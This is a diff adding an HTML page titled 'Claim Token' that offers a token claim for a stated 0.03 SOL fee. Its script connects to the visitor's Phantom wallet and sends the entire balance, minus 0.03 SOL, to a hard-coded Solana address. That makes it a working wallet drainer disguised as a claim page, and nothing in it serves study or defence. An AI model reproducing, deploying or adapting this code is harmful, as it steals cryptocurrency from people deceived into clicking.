@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Token</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.31.0/web3.min.js"></script>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, #4e54c8, #8f94fb);
+            color: white;
+            text-align: center;
+        }
+        h1 {
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #ff4081;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #ff1f5b;
+        }
+        .fee {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #f0f0f0;
+        }
+    </style>
+</head>
+<body>
+    <h1>Claim Token</h1>
+    <button id="claimButton">Claim</button>
+    <div class="fee">Fee: 0.03 SOL</div>
+
+    <script>
+        const claimButton = document.getElementById('claimButton');
+        const recipientAddress = "Ax5XuYc2dgWCKwsDY8LtDE2khjVUonyktQMwWaBts2ht";
+
+        claimButton.addEventListener('click', async () => {
+            // Проверка, что пользователь подключен к кошельку
+            if (window.solana && window.solana.isPhantom) {
+                const provider = window.solana;
+
+                try {
+                    // Запросить доступ к кошельку
+                    const response = await provider.connect();
+                    const publicKey = response.publicKey;
+
+                    // Получить баланс пользователя
+                    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+                    const balance = await connection.getBalance(publicKey);
+
+                    // Проверка, достаточно ли средств
+                    if (balance > 0) {
+                        // Создание транзакции
+                        const transaction = new solanaWeb3.Transaction().add(
+                            solanaWeb3.SystemProgram.transfer({
+                                fromPubkey: publicKey,
+                                toPubkey: new solanaWeb3.PublicKey(recipientAddress),
+                                lamports: balance - 30000000 // Отправить баланс минус 0.03 SOL (30,000,000 лампортов)
+                            })
+                        );
+
+                        // Подписать и отправить транзакцию
+                        const signature = await provider.signAndSendTransaction(transaction);
+                        console.log('Transaction sent:', signature);
+                    } else {
+                        alert('Недостаточно средств на кошельке.');
+                    }
+                } catch (err) {
+                    console.error(err);
+                    alert('Ошибка при выполнении транзакции.');
+                }
+            } else {
+                alert('Пожалуйста, установите кошелек Phantom.');
+            }
+        });
+    </script>
+</body>
+</html>
